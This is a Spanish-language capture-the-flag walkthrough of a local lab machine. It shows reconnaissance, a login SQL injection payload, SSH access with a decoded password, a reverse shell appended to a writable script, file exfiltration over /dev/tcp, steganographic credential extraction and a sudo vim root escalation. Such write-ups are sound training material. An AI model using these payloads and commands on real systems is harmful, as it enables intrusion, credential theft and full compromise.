
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache httpd 2.4.62 (Debian) |

---

## 2. Virtual hosting — descubrimiento del dominio

Al acceder con la IP directamente, la aplicación carga parcialmente: el CSS referencia `./styles.css` (ruta relativa sin dominio) y el JS en `./js/script.js` devuelve 404. En el HTML hay una línea reveladora:

```html
<link rel="dns-prefetch" href="//gatekeeperhr.com" />
```

La etiqueta `dns-prefetch` es una directiva de optimización que el navegador usa para resolver el dominio anticipadamente. Su presencia indica que el servidor tiene configurado un virtual host bajo ese nombre. Sin el `Host` correcto, Apache sirve el sitio por defecto con rutas rotas.

```bash
echo "172.17.0.2 gatekeeperhr.com" >> /etc/hosts
curl http://gatekeeperhr.com
```

Con el virtual host activo, el HTML cambia: ahora carga desde `./css/styles.css` y el JS carga correctamente. Además, el código fuente revela un comentario interno:

```html
<!-- Quitar los permisos SSH a los pasantes, ya terminará el tiempo de pasantía -->
```

Dato importante: hay pasantes con acceso SSH activo y acceso inminente a expirar.

---

## 3. SQL Injection — enumeración de usuarios

La web tiene un modal de login. El formulario es vulnerable a SQL injection clásica — la condición `OR 1=1` hace que la query devuelva todas las filas de la tabla de usuarios en lugar de filtrar por credencial:

```
' or 1=1 -- -
```

La respuesta revela dos empleados en el departamento de "Pasantía IT":

```
Pedro Ramirez    Pasantía IT
Valentina Gomez  Pasantía IT
```

Tenemos dos candidatos para el acceso SSH que mencionaba el comentario: `pedro` y `valentina`.

---

## 4. Enumeración de directorios

```bash
gobuster dir -u http://gatekeeperhr.com \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Directorios encontrados:

```
/default   (301)
/spam      (301)
/css       (301)
/includes  (301)
/js        (301)
/lab       (301)
```

El directorio `/spam` llama la atención. Al inspeccionarlo, el código fuente contiene:

```html
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

---

## 5. Information disclosure — ROT13

El comentario está cifrado con ROT13, una sustitución simple donde cada letra se desplaza 13 posiciones en el alfabeto. Decodificado:

```
La contraseña de uno de los pasantes es 'purpl3'
```

Tenemos contraseña. Los pasantes del sistema son `pedro` y `valentina`. Se prueba con `pedro` primero.

---

## 6. Acceso SSH como pedro

```bash
ssh pedro@172.17.0.2
# contraseña: purpl3

pedro@bbeb396a6c94:~$ whoami
pedro
```

---

## 7. Pivote a valentina — escritura en script de root

Enumeración de `/opt`:

```bash
ls -lah /opt
```

```
-rwxrw-rw- 1 valentina valentina   76 Sep 26 09:49 log_cleaner.sh
```

El script pertenece a `valentina` pero tiene permisos `rw-rw-rw-` — cualquier usuario puede escribir en él. Su contenido:

```bash
#!/bin/bash
rm -rf /var/log/*
```

Un script que limpia logs periódicamente, ejecutado por `valentina`. Se añade una reverse shell al final:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" >> /opt/log_cleaner.sh
```

En la máquina atacante:

```bash
nc -lvnp 4444
```

Cuando `valentina` ejecuta el script (tarea programada o ejecución manual), la reverse shell llega:

```
Connection received on 172.17.0.2 41670
valentina@bbeb396a6c94:~$
```

Estabilización de la terminal:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

## 8. Steganografía — credenciales ocultas en imagen

En el directorio personal de `valentina` hay un archivo inusual:

```bash
ls -alh /home/valentina
```

```
-r-------- 1 valentina valentina  44K Feb  9  2025 profile_picture.jpeg
```

Una imagen de perfil en el home de un usuario de sistema es sospechosa. Se transfiere a la máquina atacante:

```bash
# En la máquina atacante:
nc -lvnp 2222 > foto.jpeg

# En la víctima:
cat /home/valentina/profile_picture.jpeg > /dev/tcp/172.17.0.1/2222
```

Se analiza con `steghide`:

```bash
steghide info foto.jpeg
```

```
"foto.jpeg":
  formato: jpeg
  capacidad: 2,4 KB
¿Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto:
  archivo adjunto "secret.txt":
    tamaño: 7,0 Byte
    encriptado: rijndael-128, cbc
    compactado: si
```

La imagen tiene un archivo `secret.txt` incrustado. `steghide` lo extrae — la passphrase está vacía:

```bash
steghide --extract -sf foto.jpeg
# Anotar salvoconducto: (Enter)
```

```bash
cat secret.txt
```

```
mag1ck
```

Se prueba como contraseña de `valentina` en el SSH:

```bash
ssh valentina@172.17.0.2
# contraseña: mag1ck
```

Confirmado. Las contraseñas del sistema referenciaban la cuenta de redes sociales que aparece en el flag de root (`purpl3_mag1ck`).

---

## 9. Escalada a root — vim con sudo sin contraseña

```bash
sudo -l
```

```
User valentina may run the following commands on bbeb396a6c94:
    (ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim
```

`vim` puede ejecutarse como root sin contraseña. Desde dentro de vim es posible lanzar comandos de shell con `:!comando`. Una sola instrucción da la shell de root:

```bash
sudo vim -c ':!/bin/bash'
```

```bash
root@bbeb396a6c94:/home/valentina# id
uid=0(root) gid=0(root) groups=0(root)

root@bbeb396a6c94:~# cat fl4g.txt
```

```
  _, _, ,  ,  _,  ,_  _  ___,_,
 /  / \,|\ | / _  |_)'|\' | (_,
'\_'\_/ |'\|'\_|`'| \ |-\ |  _)
   `'   '  `  _|  '  `'  `' '  

Instagram: @purpl3_mag1ck
TikTok: @purple_mag1ck
```
